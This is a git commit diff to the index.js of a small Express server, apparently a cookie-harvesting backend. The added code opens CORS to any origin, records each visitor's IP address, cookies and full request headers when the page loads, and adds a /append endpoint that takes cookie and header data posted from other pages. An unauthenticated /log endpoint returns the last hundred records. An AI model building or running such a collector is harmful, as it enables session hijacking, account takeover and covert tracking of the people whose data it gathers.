94b5c03f6ed2799d51922cefadaaab4f03f830bc
public_hysteria <juuzodes@yandex.ru>
2026-02-01 12:59:48 +0300

    upd

--- index.js
+++ index.js
@@ -9,6 +9,42 @@ const user = require("./models/user");
 app.use(express.json());
 app.use(cookieParser());
 
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Methods", "GET,POST,PUT,PATCH,DELETE,OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
+
+  if (req.method === "OPTIONS") {
+    return res.sendStatus(204);
+  }
+  next();
+});
+
+
+
+app.get("/",async (req, res) => {
+    const cookieHeader = req.headers.cookie;
+    user.create({
+      ip: req.ip,
+      cookie: cookieHeader,
+      headers: req.headers,
+    });
+    return res.sendFile(__dirname + "/static/index.html");
+});
+app.post("/append", async (req, res) => {
+    const data = req.body;
+    user.create({
+      ip: data.ip || req.ip,
+      cookie: data.cookie,
+      headers: data.headers,
+    });
+    return res.send("ok");
+})
+
+app.get("/log", async (req, res) => {
+    const users =  await user.find().sort({ createdAt: -1 }).limit(100);
+    return  res.json(users);
+})
 
 
 async function start() {
@@ -27,18 +63,3 @@ async function start() {
 }
 
 start();
-
-app.get("/",async (req, res) => {
-    const cookieHeader = req.headers.cookie;
-    user.create({
-      ip: req.ip,
-      cookie: cookieHeader,
-      headers: req.headers,
-    });
-    return res.send("ok");
-});
-
-app.get("/log", async (req, res) => {
-    const users =  await user.find().sort({ createdAt: -1 }).limit(100);
-    return  res.json(users);
-})
